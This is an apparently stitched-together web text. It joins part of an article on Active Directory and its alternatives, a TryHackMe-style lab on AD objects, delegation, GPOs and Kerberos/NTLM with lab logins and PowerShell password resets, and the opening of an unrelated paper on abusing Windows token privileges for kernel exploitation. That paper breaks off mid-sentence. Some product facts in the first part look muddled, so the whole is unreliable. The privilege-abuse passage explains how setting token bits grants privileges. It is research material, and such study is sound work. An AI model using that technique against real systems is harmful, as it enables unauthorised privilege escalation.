In complex businesses, multiple domain controllers are essential to run business operations. When identities are managed by a central database system, subdomain controllers are aware of the updates happening in the AD database. Thus, AD can delegate responsibilities to centralized domain controllers through organization tools to add, delete, or modify active or inactive identities/objects. Such synchronization facilities ensure that data is consistent across all domain controllers. As a result, organizations can make changes in their operations within a few clicks.</p>
</li>
<li>
<p>Enables periodic audits
Auditing is essential for organizations to stay up to date on new and emerging security threats. AD allows periodic audits of events occurring in identity infrastructure, such as object authentication or user access violation. With a central database in place, such threat data can easily be collected and used for troubleshooting purposes.</p>
</li>
<li>
<p>Provides network security
AD acts as a security tool that safeguards an organization’s network from external threats. Higher-level management authorities and key stakeholders can also use AD to set permissions for network resources and applications for other administrators or users. Additionally, since AD is structured hierarchically, objects within the AD tree or forest can inherit permissions from parent objects. Such features assist in identifying corporate or remote users uniquely and securely.</p>
</li>
</ol>
<p>Administrators can also duly update access permissions within one database, which reduces the chances of incorrect or outdated configuration in the directory.</p>
<ol start="5">
<li>Allows single sign-on functionality
An enterprise typically uses multiple applications within its framework. However, each of these applications employs its own authentication mechanisms. Since AD supports SSO features, users can sign in with one set of credentials and get access to other independent software systems used by the enterprise. In simple words, users need not sign in every time to gain access to a newer application. Once a user gets authenticated on a computer system, the credentials of that session are used to authenticate other AD-integrated applications.</li>
</ol>

<p>Top Alternatives To Active Directory
It would be an understatement to say that privacy is a major concern for all organizations. Microsoft has already provided a solution to this through Active Directory. However, several other players are operating in the market who are helping enterprises secure their networks.</p>
<p>According to 2023 data from 6sense, the Identity and Access Management (IAM) market is dominated by Microsoft Active Directory with 33.48% market share, followed by Azure Active Directory (13.46%), Microsoft Azure Active Directory (10.37%), and AWS Identity and Access Management (5.54%).</p>
<p>These are the top alternatives to AD that are commercially available in the market:</p>
<ol>

Apache Directory is open-source software designed by Apache Software Foundation. The solution is a Java-based directory server and is LDAP V3-certified. The directory was approved by Open Group and Eclipse-based databases in 2006. It can support additional codes owing to its integration with the Kerberos server.</li>
</ol>
<p>Advanced features include a schema browser, Directory Services Markup Language (DSML) editor, LDAP editor/browser, and LDAP Data Interchange Format (LDIF) editor for the Eclipse-based directory server. Here, LDIF represents the LDA directory content, which shows one record for each object or entry. Additionally, new features can be incorporated into Apache Directory by upgrading Eclipse-based plugins.</p>
<ol start="2">
<li>Open LDAP
Open LDAP is an open-source tool designed under the OpenLDAP project. It’s an administration tool used for LDAP database control. It is typically regarded as a Windows LDAP client that allows you to browse, look up, create, change, and delete elements residing on the LDAP server.</li>
</ol>
<p>Other features include scheme browsing, password management, export and import LDIF, and more.</p>
<ol start="3">
<li>FreeIPA
FreeIPA is an open-source identity and authentication tool developed by Red Hat. It offers a suite of services such as identity management, audit services, and policies tailored for Linux and Unix computer networks. The current version of the project RHEL 6.2 (Red Hat Enterprise Linux 6) aims to incorporate several features AD offers.</li>
</ol>
<p>Some of its key features include:</p>
<p>Security information management solution that blends Linux (Fedora), 389 Directory Server, MIT Kerberos, and others

4. Samba
Samba is an open-source tool that runs on Unix platforms and coexists with Windows. While it operates in the Unix environment, the tool seamlessly talks to Windows clients. The directory allows you to shift from a Unix to a Windows network easily. As a result, you can access Windows files and print services without worrying about the underlying Unix system.</p>
<p>The Samba project relies on a CIFS implementation (Common Internet File System) to accomplish the above switching tasks. The project has already been shifted to several non-Unix host systems, such as NetWare, AmigaOS, and VMS.</p>
<ol start="5">
<li>Univention Corporate Server (UCS)
Univention Corporate Server is a server software that controls server applications, thereby managing IT operations. It has an integrated system to control multi-platform servers, clients, users, and services, including machines operated in UCS. Hence, the software is adopted by Debian GNU/Linux, a Linux-based operating system found in laptops, desktops, and servers.</li>
</ol>
<p>UCS underwent an upgrade to Version 3.0, following which the software has started supporting AD’s features to administer machines that run on Microsoft Windows.</p>

<p>Lepide Auditor for Active Directory
Lepide Auditor for Active Directory has been designed to monitor, audit, and report changes as and when they are made. The tool can look for modifications made in the directory and uncover the ones that are not required. It allows you to check who made the changes, what they were, and when and where they were done. Moreover, the tool is equipped with a facility to notify whenever any change is made to the directory.</p>
</li>
</ol>
<p>Some other features include customizable control panel views, building audit logs at one location, generating views to look for directory modifications and a panel for audited systems. The auditor can also detect risks, keep a check on common attack paths, and mitigate attacks in real-time.</p>

Jxplorer is a cross-platform tool that can be run on Windows, Linux, and many other operating systems. It provides LDAP and DSML interfaces that enable you to monitor and manage an LDAP directory without using the traditional command line. It is a Java-based tool that is quite adaptable and easy to configure. It is available in free and paid versions for businesses.</li>
</ol>
<p>The core of any Windows Domain is the Active Directory Domain Service (AD DS). This service acts as a catalogue that holds the information of all of the &quot;objects&quot; that exist on your network. Amongst the many objects supported by AD, we have users, groups, machines, printers, shares and many others. Let's look at some of them:</p>
<p>Users</p>
<p>Users are one of the most common object types in Active Directory. Users are one of the objects known as security principals, meaning that they can be authenticated by the domain and can be assigned privileges over resources like files or printers. You could say that a security principal is an object that can act upon resources in the network.</p>
<p>Users can be used to represent two types of entities:</p>
<p>People: users will generally represent persons in your organisation that need to access the network, like employees.
Services: you can also define users to be used by services like IIS or MSSQL. Every single service requires a user to run, but service users are different from regular users as they will only have the privileges needed to run their specific service.
Machines</p>
<p>Machines are another type of object within Active Directory; for every computer that joins the Active Directory domain, a machine object will be created. Machines are also considered &quot;security principals&quot; and are assigned an account just as any regular user. This account has somewhat limited rights within the domain itself.</p>
<p>The machine accounts themselves are local administrators on the assigned computer, they are generally not supposed to be accessed by anyone except the computer itself, but as with any other account, if you have the password, you can use it to log in.</p>
<p>Note: Machine Account passwords are automatically rotated out and are generally comprised of 120 random characters.</p>
<p>Identifying machine accounts is relatively easy. They follow a specific naming scheme. The machine account name is the computer's name followed by a dollar sign. For example, a machine named DC01 will have a machine account called DC01$.</p>
<p>Security Groups</p>
<p>If you are familiar with Windows, you probably know that you can define user groups to assign access rights to files or other resources to entire groups instead of single users. This allows for better manageability as you can add users to an existing group, and they will automatically inherit all of the group's privileges. Security groups are also considered security principals and, therefore, can have privileges over resources on the network.</p>
<p>Groups can have both users and machines as members. If needed, groups can include other groups as well.</p>
<p>Several groups are created by default in a domain that can be used to grant specific privileges to users. As an example, here are some of the most important groups in a domain:</p>
<div class="table-wrapper"><table><thead><tr><th>Security Group</th><th>Description</th></tr></thead><tbody>
<tr><td>Domain Admins</td><td>Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs.</td></tr>
<tr><td>Server Operators</td><td>Users in this group can administer Domain Controllers. They cannot change any administrative group memberships.</td></tr>
<tr><td>Backup Operators</td><td>Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers.</td></tr>
<tr><td>Account Operators</td><td>Users in this group can create or modify other accounts in the domain.</td></tr>
<tr><td>Domain Users</td><td>Includes all existing user accounts in the domain.</td></tr>
<tr><td>Domain Computers</td><td>Includes all existing computers in the domain.</td></tr>
<tr><td>Domain Controllers</td><td>Includes all existing DCs on the domain.</td></tr>
</tbody></table>
</div>
<p>You can obtain the complete list of default security groups from the Microsoft documentation.</p>
<p>Active Directory Users and Computers</p>
<p>To configure users, groups or machines in Active Directory, we need to log in to the Domain Controller and run &quot;Active Directory Users and Computers&quot; from the start menu:</p>
<p>Start menu AD Users and Computers</p>
<p>This will open up a window where you can see the hierarchy of users, computers and groups that exist in the domain. These objects are organised in Organizational Units (OUs) which are container objects that allow you to classify users and machines. OUs are mainly used to define sets of users with similar policing requirements. The people in the Sales department of your organisation are likely to have a different set of policies applied than the people in IT, for example. Keep in mind that a user can only be a part of a single OU at a time.</p>
<p>Checking our machine, we can see that there is already an OU called THM with four child OUs for the IT, Management, Marketing and Sales departments. It is very typical to see the OUs mimic the business' structure, as it allows for efficiently deploying baseline policies that apply to entire departments. Remember that while this would be the expected model most of the time, you can define OUs arbitrarily. Feel free to right-click the THM OU and create a new OU under it called Students just for the fun of it.</p>
<p>AD Users and Computers</p>
<p>If you open any OUs, you can see the users they contain and perform simple tasks like creating, deleting or modifying them as needed. You can also reset passwords if needed (pretty useful for the helpdesk):</p>
<p>IT department OU</p>
<p>You probably noticed already that there are other default containers apart from the THM OU. These containers are created by Windows automatically and contain the following:</p>
<p>Builtin: Contains default groups available to any Windows host.
Computers: Any machine joining the network will be put here by default. You can move them if needed.
Domain Controllers: Default OU that contains the DCs in your network.
Users: Default users and groups that apply to a domain-wide context.
Managed Service Accounts: Holds accounts used by services in your Windows domain.
Security Groups vs OUs</p>
<p>You are probably wondering why we have both groups and OUs. While both are used to classify users and computers, their purposes are entirely different:</p>
<p>OUs are handy for applying policies to users and computers, which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn't make sense to try to apply two different sets of policies to a single user.
Security Groups, on the other hand, are used to grant permissions over resources. For example, you will use groups if you want to allow some users to access a shared folder or network printer. A user can be a part of many groups, which is needed to grant access to multiple resources.</p>
<p>Your first task as the new domain administrator is to check the existing AD OUs and users, as some recent changes have happened to the business. You have been given the following organisational chart and are expected to make changes to the AD to match it:</p>
<p>THM Organisational Chart</p>
<p>Deleting extra OUs and users</p>
<p>The first thing you should notice is that there is an additional department OU in your current AD configuration that doesn't appear in the chart. We've been told it was closed due to budget cuts and should be removed from the domain. If you try to right-click and delete the OU, you will get the following error:</p>
<p>OU delete error</p>
<p>By default, OUs are protected against accidental deletion. To delete the OU, we need to enable the Advanced Features in the View menu:</p>
<p>Enabling advanced features</p>
<p>This will show you some additional containers and enable you to disable the accidental deletion protection. To do so, right-click the OU and go to Properties. You will find a checkbox in the Object tab to disable the protection:</p>
<p>Disable OU delete protection</p>
<p>Be sure to uncheck the box and try deleting the OU again. You will be prompted to confirm that you want to delete the OU, and as a result, any users, groups or OUs under it will also be deleted.</p>
<p>After deleting the extra OU, you should notice that for some of the departments, the users in the AD don't match the ones in our organisational chart. Create and delete users as needed to match them.</p>
<p>Delegation</p>
<p>One of the nice things you can do in AD is to give specific users some control over some OUs. This process is known as delegation and allows you to grant users specific privileges to perform advanced tasks on OUs without needing a Domain Administrator to step in.</p>
<p>One of the most common use cases for this is granting IT support the privileges to reset other low-privilege users' passwords. According to our organisational chart, Phillip is in charge of IT support, so we'd probably want to delegate the control of resetting passwords over the Sales, Marketing and Management OUs to him.</p>
<p>For this example, we will delegate control over the Sales OU to Phillip. To delegate control over an OU, you can right-click it and select Delegate Control:</p>
<p>Delegating OU control</p>
<p>This should open a new window where you will first be asked for the users to whom you want to delegate control:</p>
<p>Note: To avoid mistyping the user's name, write &quot;phillip&quot; and click the Check Names button. Windows will autocomplete the user for you.</p>
<p>Delegating Sales OU to Phillip</p>
<p>Click OK, and on the next step, select the following option:</p>
<p>Delegating password resets</p>
<p>Click next a couple of times, and now Phillip should be able to reset passwords for any user in the sales department. While you'd probably want to repeat these steps to delegate the password resets of the Marketing and Management departments, we'll leave it here for this task. You are free to continue to configure the rest of the OUs if you so desire.</p>
<p>Now let's use Phillip's account to try and reset Sophie's password. Here are Phillip's credentials for you to log in via RDP:</p>
<p>THM key
Username	phillip
Password	Claire2008
Note: When connecting via RDP, use THM\phillip as the username to specify you want to log in using the user phillip on the THM domain.</p>
<p>While you may be tempted to go to Active Directory Users and Computers to try and test Phillip's new powers, he doesn't really have the privileges to open it, so you'll have to use other methods to do password resets. In this case, we will be using Powershell to do so:</p>
<pre><code class="language-powershell">Windows PowerShell (As Phillip)
PS C:\Users\phillip&gt; Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

New Password: *********

VERBOSE: Performing the operation &quot;Set-ADAccountPassword&quot; on target &quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;.
</code></pre>
<p>Since we wouldn't want Sophie to keep on using a password we know, we can also force a password reset at the next logon with the following command:</p>
<pre><code class="language-powershell">Windows PowerShell (as Phillip)
PS C:\Users\phillip&gt; Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose

VERBOSE: Performing the operation &quot;Set&quot; on target &quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;.
</code></pre>
<p>THM flag
Log into Sophie's account with your new password and retrieve a flag from Sophie's desktop.
Note: When connecting via RDP, use THM\sophie as the username to specify you want to log in using the user sophie on the THM domain.</p>
<p>By default, all the machines that join a domain (except for the DCs) will be put in the container called &quot;Computers&quot;. If we check our DC, we will see that some devices are already there:</p>
<p>Computers OU</p>
<p>We can see some servers, some laptops and some PCs corresponding to the users in our network. Having all of our devices there is not the best idea since it's very likely that you want different policies for your servers and the machines that regular users use on a daily basis.</p>
<p>While there is no golden rule on how to organise your machines, an excellent starting point is segregating devices according to their use. In general, you'd expect to see devices divided into at least the three following categories:</p>
<ol>
<li>Workstations</li>
</ol>
<p>Workstations are one of the most common devices within an Active Directory domain. Each user in the domain will likely be logging into a workstation. This is the device they will use to do their work or normal browsing activities. These devices should never have a privileged user signed into them.</p>
<ol start="2">
<li>Servers</li>
</ol>
<p>Servers are the second most common device within an Active Directory domain. Servers are generally used to provide services to users or other servers.</p>
<ol start="3">
<li>Domain Controllers</li>
</ol>
<p>Domain Controllers are the third most common device within an Active Directory domain. Domain Controllers allow you to manage the Active Directory Domain. These devices are often deemed the most sensitive devices within the network as they contain hashed passwords for all user accounts within the environment.</p>
<p>Since we are tidying up our AD, let's create two separate OUs for Workstations and Servers (Domain Controllers are already in an OU created by Windows). We will be creating them directly under the thm.local domain container. In the end, you should have the following OU structure:</p>
<p>final OU structure</p>
<p>Now, move the personal computers and laptops to the Workstations OU and the servers to the Servers OU from the Computers container. Doing so will allow us to configure policies for each OU later.</p>
<p>So far, we have organised users and computers in OUs just for the sake of it, but the main idea behind this is to be able to deploy different policies for each OU individually. That way, we can push different configurations and security baselines to users depending on their department.</p>
<p>Windows manages such policies through Group Policy Objects (GPO). GPOs are simply a collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers, allowing you to set a baseline on specific machines and identities.</p>
<p>To configure GPOs, you can use the Group Policy Management tool, available from the start menu:</p>
<p>Start menu GPM</p>
<p>The first thing you will see when opening it is your complete OU hierarchy, as defined before. To configure Group Policies, you first create a GPO under Group Policy Objects and then link it to the OU where you want the policies to apply. As an example, you can see there are some already existing GPOs in your machine:</p>
<p>Existing OUs in your machine</p>
<p>We can see in the image above that 3 GPOs have been created. From those, the Default Domain Policy and RDP Policy are linked to the thm.local domain as a whole, and the Default Domain Controllers Policy is linked to the Domain Controllers OU only. Something important to have in mind is that any GPO will apply to the linked OU and any sub-OUs under it. For example, the Sales OU will still be affected by the Default Domain Policy.</p>
<p>Let's examine the Default Domain Policy to see what's inside a GPO. The first tab you'll see when selecting a GPO shows its scope, which is where the GPO is linked in the AD. For the current policy, we can see that it has only been linked to the thm.local domain:</p>
<p>OU scope</p>
<p>As you can see, you can also apply Security Filtering to GPOs so that they are only applied to specific users/computers under an OU. By default, they will apply to the Authenticated Users group, which includes all users/PCs.</p>
<p>The Settings tab includes the actual contents of the GPO and lets us know what specific configurations it applies. As stated before, each GPO has configurations that apply to computers only and configurations that apply to users only. In this case, the Default Domain Policy only contains Computer Configurations:</p>
<p>OU Settings</p>
<p>Feel free to explore the GPO and expand on the available items using the &quot;show&quot; links on the right side of each configuration. In this case, the Default Domain Policy indicates really basic configurations that should apply to most domains, including password and account lockout policies:</p>
<p>OU detailed settings</p>
<p>Since this GPO applies to the whole domain, any change to it would affect all computers. Let's change the minimum password length policy to require users to have at least 10 characters in their passwords. To do this, right-click the GPO and select Edit:</p>
<p>Editing a GPO settings</p>
<p>This will open a new window where we can navigate and edit all the available configurations. To change the minimum password length, go to Computer Configurations -&gt; Policies -&gt; Windows Setting -&gt; Security Settings -&gt; Account Policies -&gt; Password Policy and change the required policy value:</p>
<p>Password policy GPO</p>
<p>As you can see, plenty of policies can be established in a GPO. While explaining every single of them would be impossible in a single room, do feel free to explore a bit, as some of the policies are straightforward. If more information on any of the policies is needed, you can double-click them and read the Explain tab on each of them:</p>
<p>OU settings explain tab</p>
<p>GPO distribution</p>
<p>GPOs are distributed to the network via a network share called SYSVOL, which is stored in the DC. All users in a domain should typically have access to this share over the network to sync their GPOs periodically. The SYSVOL share points by default to the C:\Windows\SYSVOL\sysvol\ directory on each of the DCs in our network.</p>
<p>Once a change has been made to any GPOs, it might take up to 2 hours for computers to catch up. If you want to force any particular computer to sync its GPOs immediately, you can always run the following command on the desired computer:</p>
<p>Windows PowerShell
PS C:&gt; gpupdate /force
Creating some GPOs for THM Inc.</p>
<p>As part of our new job, we have been tasked with implementing some GPOs to allow us to:</p>
<p>Block non-IT users from accessing the Control Panel.
Make workstations and servers lock their screen automatically after 5 minutes of user inactivity to avoid people leaving their sessions exposed.
Let's focus on each of those and define what policies we should enable in each GPO and where they should be linked.</p>
<p>Restrict Access to Control Panel</p>
<p>We want to restrict access to the Control Panel across all machines to only the users that are part of the IT department. Users of other departments shouldn't be able to change the system's preferences.</p>
<p>Let's create a new GPO called Restrict Control Panel Access and open it for editing. Since we want this GPO to apply to specific users, we will look under User Configuration for the following policy:</p>
<p>Restricting access to control panel</p>
<p>Notice we have enabled the Prohibit Access to Control Panel and PC settings policy.</p>
<p>Once the GPO is configured, we will need to link it to all of the OUs corresponding to users who shouldn't have access to the Control Panel of their PCs. In this case, we will link the Marketing, Management and Sales OUs by dragging the GPO to each of them:</p>
<p>Linking Restrict Control Panel GPO</p>
<p>Auto Lock Screen GPO</p>
<p>For the first GPO, regarding screen locking for workstations and servers, we could directly apply it over the Workstations, Servers and Domain Controllers OUs we created previously.</p>
<p>While this solution should work, an alternative consists of simply applying the GPO to the root domain, as we want the GPO to affect all of our computers. Since the Workstations, Servers and Domain Controllers OUs are all child OUs of the root domain, they will inherit its policies.</p>
<p>Note: You might notice that if our GPO is applied to the root domain, it will also be inherited by other OUs like Sales or Marketing. Since these OUs contain users only, any Computer Configuration in our GPO will be ignored by them.</p>
<p>Let's create a new GPO, call it Auto Lock Screen, and edit it. The policy to achieve what we want is located in the following route:</p>
<p>Configuring machine inactivity limit</p>
<p>We will set the inactivity limit to 5 minutes so that computers get locked automatically if any user leaves their session open. After closing the GPO editor, we will link the GPO to the root domain by dragging the GPO to it:</p>
<p>Linking Auto Lock Screen GPO</p>
<p>Once the GPOs have been applied to the correct OUs, we can log in as any users in either Marketing, Sales or Management for verification. For this task, let's connect via RDP using Mark's credentials:</p>
<p>THM key
Username	Mark
Password	M4rk3t1ng.21
Note: When connecting via RDP, use THM\Mark as the username to specify you want to log in using the user Mark on the THM domain.</p>
<p>If we try opening the Control Panel, we should get a message indicating this operation is denied by the administrator. You can also wait 5 minutes to check if the screen is automatically locked if you want.</p>
<p>Since we didn't apply the control panel GPO on IT, you should still be able to log into the machine as any of those users and access the control panel. </p>
<p>Note: If you created and linked the GPOs, but for some reason, they still don't work, remember you can run gpupdate /force to force GPOs to be updated.</p>
<p>So far, we have discussed how to manage a single domain, the role of a Domain Controller and how it joins computers, servers and users.</p>
<p>Single Domain</p>
<p>As companies grow, so do their networks. Having a single domain for a company is good enough to start, but in time some additional needs might push you into having more than one.</p>
<p>Trees</p>
<p>Imagine, for example, that suddenly your company expands to a new country. The new country has different laws and regulations that require you to update your GPOs to comply. In addition, you now have IT people in both countries, and each IT team needs to manage the resources that correspond to each country without interfering with the other team. While you could create a complex OU structure and use delegations to achieve this, having a huge AD structure might be hard to manage and prone to human errors.</p>
<p>Luckily for us, Active Directory supports integrating multiple domains so that you can partition your network into units that can be managed independently. If you have two domains that share the same namespace (thm.local in our example), those domains can be joined into a Tree.</p>
<p>If our thm.local domain was split into two subdomains for UK and US branches, you could build a tree with a root domain of thm.local and two subdomains called uk.thm.local and us.thm.local, each with its AD, computers and users:</p>
<p>Tree</p>
<p>This partitioned structure gives us better control over who can access what in the domain. The IT people from the UK will have their own DC that manages the UK resources only. For example, a UK user would not be able to manage US users. In that way, the Domain Administrators of each branch will have complete control over their respective DCs, but not other branches' DCs. Policies can also be configured independently for each domain in the tree.</p>
<p>A new security group needs to be introduced when talking about trees and forests. The Enterprise Admins group will grant a user administrative privileges over all of an enterprise's domains. Each domain would still have its Domain Admins with administrator privileges over their single domains and the Enterprise Admins who can control everything in the enterprise.</p>
<p>Forests</p>
<p>The domains you manage can also be configured in different namespaces. Suppose your company continues growing and eventually acquires another company called MHT Inc. When both companies merge, you will probably have different domain trees for each company, each managed by its own IT department. The union of several trees with different namespaces into the same network is known as a forest.</p>
<p>Forest</p>
<p>Trust Relationships</p>
<p>Having multiple domains organised in trees and forest allows you to have a nice compartmentalised network in terms of management and resources. But at a certain point, a user at THM UK might need to access a shared file in one of MHT ASIA servers. For this to happen, domains arranged in trees and forests are joined together by trust relationships.</p>
<p>In simple terms, having a trust relationship between domains allows you to authorise a user from domain THM UK to access resources from domain MHT EU.</p>
<p>The simplest trust relationship that can be established is a one-way trust relationship. In a one-way trust, if Domain AAA trusts Domain BBB, this means that a user on BBB can be authorised to access resources on AAA:</p>
<p>Trusts</p>
<p>The direction of the one-way trust relationship is contrary to that of the access direction.</p>
<p>Two-way trust relationships can also be made to allow both domains to mutually authorise users from the other. By default, joining several domains under a tree or a forest will form a two-way trust relationship.</p>
<p>It is important to note that having a trust relationship between domains doesn't automatically grant access to all resources on other domains. Once a trust relationship is established, you have the chance to authorise users across different domains, but it's up to you what is actually authorised or not.</p>
<p>When using Windows domains, all credentials are stored in the Domain Controllers. Whenever a user tries to authenticate to a service using domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be used for network authentication in windows domains:</p>
<p>Kerberos: Used by any recent version of Windows. This is the default protocol in any recent domain.
NetNTLM: Legacy authentication protocol kept for compatibility purposes.
While NetNTLM should be considered obsolete, most networks will have both protocols enabled. Let's take a deeper look at how each of these protocols works.</p>
<p>Kerberos Authentication</p>
<p>Kerberos authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.</p>
<p>When Kerberos is used for authentication, the following process happens:</p>
<p>The user sends their username and a timestamp encrypted using a key derived from their password to the Key Distribution Center (KDC), a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.</p>
<p>The KDC will create and send back a Ticket Granting Ticket (TGT), which will allow the user to request additional tickets to access specific services. The need for a ticket to get more tickets may sound a bit weird, but it allows users to request service tickets without passing their credentials every time they want to connect to a service. Along with the TGT, a Session Key is given to the user, which they will need to generate the following requests.</p>
<p>Notice the TGT is encrypted using the krbtgt account's password hash, and therefore the user can't access its contents. It is essential to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.</p>
<p>Kerberos step 1</p>
<p>When a user wants to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a Ticket Granting Service (TGS). TGS are tickets that allow connection only to the specific service they were created for. To request a TGS, the user will send their username and a timestamp encrypted using the Session Key, along with the TGT and a Service Principal Name (SPN), which indicates the service and server name we intend to access.</p>
<p>As a result, the KDC will send us a TGS along with a Service Session Key, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived from the Service Owner Hash. The Service Owner is the user or machine account that the service runs under. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.</p>
<p>Kerberos step 2</p>
<p>The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.
Kerberos step 3</p>
<p>NetNTLM Authentication</p>
<p>NetNTLM works using a challenge-response mechanism. The entire process is as follows:</p>
<p>NetNTLM authentication</p>
<p>The client sends an authentication request to the server they want to access.
The server generates a random number and sends it as a challenge to the client.
The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
The server forwards the challenge and the response to the Domain Controller for verification.
The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
The server forwards the authentication result to the client.
Note that the user's password (or hash) is never transmitted through the network for security.</p>
<p>Note: The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.</p>

--[ 0 - Introduction
 
Windows kernel exploitation has grown increasingly complex over the last
several years, particularly with the release of Windows 10 and its
successive core updates.  Techniques have been born and died over the
course of months, new ones quickly replacing them.  Techniques themselves
have grown hyper specific or brittle, fitting only a particular pattern or
space.    
 
Exploitation has often relied on obtaining some form of arbitrary code
execution.  Obtaining a read/write primitive, stacking strategies to evade
mitigations, and eventually obtaining the execution of a privileged action.
Recently we've seen a trend towards logic basic actions, such as token
stealing, enabling god mode bits, or NULLing out token security descriptors
[0].  These actions delegate the theft of privileges to userland, freeing 
the exploit dev from the confines of kernel hell.
 
The token stealing shellcode popularized by many exploit developers and
malware authors over the years is not one of chance.  It's been an
extremely reliable technique offering stable, simple shellcode and, until
recently, acceptable behavior.  Microsoft has implemented detection
heuristics within its Advanced Threat Protection platform [2], but as of
yet not implemented anything within the Windows kernel itself.  For malware
writers and skiddies, this might be tolerable, but for advanced adversaries
or red teamers, it is not.     
 
This paper aims to discuss one such logic-based technique that we've
refined over the last several months and exploits.  Although the techniques
themselves are not new [2], we hope to present new approaches and ideas
that may aid in the further refinement of this technique and others.
 
In addition to kernel exploitation, token privileges can be abused in other
less exotic ways. In situations where a service account is compromised,
which has non-standard privileges enabled, they can often be leveraged to
gain elevation of privilege (EoP). The methods for doing this are specific 
to each privilege, often undocumented, and in many cases non-trivial. In 
section 3.3 of this paper we demonstrate how many of these privileges can be
abused for EoP in common penetration testing and red teaming scenarios.
 
We aim to consolidate disparate sources and provide reference for future
work.  We acknowledge the time and efforts of other researches within the
same space, and hope to give something meaningful back to the community at
large.
 
--[ 1 - Token Overview
 
The basis of our strategy again stems from the very core of the object
access model within Windows.  Windows uses token objects to describe the
security context of a particular thread or process.  These token objects,
represented by the nt!_TOKEN structure, contain a vast swath of security
and referential information, including integrity level, privileges, groups,
and more.  Our focus lies on the privileges contained within these tokens.
 
----[ 1.1 - Windows Privilege Model
 
We'll briefly describe the Windows privilege model as it relates to process
and thread tokens.  If you'd like an in-depth explanation, the authors
recommend Windows Internals Part 1 or spending some time in windbg.
 
Each process on the system holds a token object reference within its
EPROCESS structure which is used during object access negotiations or
privileged system tasks.  This token is granted via LSASS during the logon
process, and thus all processes within a session run under the same token,
initially.
 
A process holds a primary token and threads executing within the process
inherit this same token.  When a thread needs to access an object using a
different set of credentials, it can use an impersonation token.  Using an
impersonation token does not impact the primary token or other threads, but
only execution in the context of the impersonating thread.  These
impersonation tokens can be obtained via a number of different APIs
provided by the kernel.
 
The token serves as a processes access ticket, which must be presented to
the various gatekeepers within Windows; it's evaluated via SeAccessCheck on
object access and by SeSinglePrivilegeCheck during privileged operations.
When a process requests write access to a file, for example, SeAccessCheck
will evaluate the tokens integrity level followed by an evaluation of its
Discretionary Access Control List (DACL).  When a process attempts to
shutdown a system via NtShutdownSystem, the kernel will evaluate whether or
not the requesting process token has SeShutdownPrivilege enabled.  
 
----[ 1.2 - Token Structure and Privileges
 
As mentioned, the _TOKEN structure primarily contains security context
information about a process or thread.  The relevant entry for our purposes
is _SEP_TOKEN_PRIVILEGES, located at offset 0x40, containing token
privilege information:
 
  kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES c5d39c30+40 
    +0x000 Present          : 0x00000006`02880000 
    +0x008 Enabled          : 0x800000
    +0x010 EnabledByDefault : 0x800000
 
The Present entry represents an unsigned long long containing the present
privileges on the token.  This does not mean that they are enabled or
disabled, but only that they exist on the token.  Once a token is created,
you cannot add privileges to it; you may only enable or disable existing
ones found in this field.  The second field, Enabled, represents an
unsigned long long containing all enabled privileges on the token.
Privileges must be enabled in this bitmask to pass the
SeSinglePrivilegeCheck.  The final field, EnabledByDefault, represents the
initial state of the token at the moment of conception.
 
Privileges can be enabled or disabled by twiddling specific bits within
these fields.  For example, to enable SeCreateTokenPrivilege, one would
simply need to execute: _SEP_TOKEN_PRIVILEGES+0x44 |= 1 &lt;&lt; 0x000000002.
Disabling the privilege would be the inverse: _SEP_TOKEN_PRIVILEGES+0x44 &amp;=
~(1 &lt;&lt; 0x000000002).  A Pykd helper script can be found here [3].
 
Up until recently, one must only set bits within the Enabled field to
actually toggle privileges within a token.  This means that a single write,
partial or otherwise, is enough to enable privileges.  With the release of
Windows 10 v1607, however, the kernel now verifies that the enabled bits
are also flipped in the Present field [4].   
 
Although on the surface the tokens security model of defining specific
privileges for various tasks appears to allow for the implementation of
service specific, fine-grained access controls, a closer look reveals a
more complex situation. Many of the privileges, when enabled, allow the
user to perform privileged actions that can result in elevation of
privilege. This effectively destroys the &quot;fine-grain&quot; access control
structure and can provide a false sense of security.
 
----[ 1.3 - Token Impersonation
 
Before diving into specific privileges, it will be beneficial to describe
the Windows mechanism for determining whether a specific thread can make
use of a given token. Any user may be able to obtain a handle to a
privileged token, but being able to actually use it is another matter.
 
In Windows, “Token Impersonation” is when a new token is assigned to a
thread that is different from the parent process's token. Although the word
impersonation implies that one user is using a token belonging to a
different user, this is not always the case. A user may impersonate a token
that belongs to them but simply has a different set of privileges or some
other modifications.
 
One of the fields specified in every token is the tokens impersonation
level. This field controls whether that token can be used for impersonation
purposes and to what degree. The four impersonation levels are as follows:
 
  SecurityAnonymous - The server cannot impersonate or identify the client.
  SecurityIdentification - The server can get the identity and privileges of
                           the client, but cannot impersonate the client.  
  SecurityImpersonation - The server can impersonate the client's security 
                          context on the local system.
  SecurityDelegation - The server can impersonate the client's security
                       context on remote systems.
 
SecurityImpersonation and SecurityDelegation are the most interesting cases
for us. Identification tokens and lower can not be used to run code.
 
Whether or not a given user is allowed to impersonate a specific token can
be determined as follows:
 
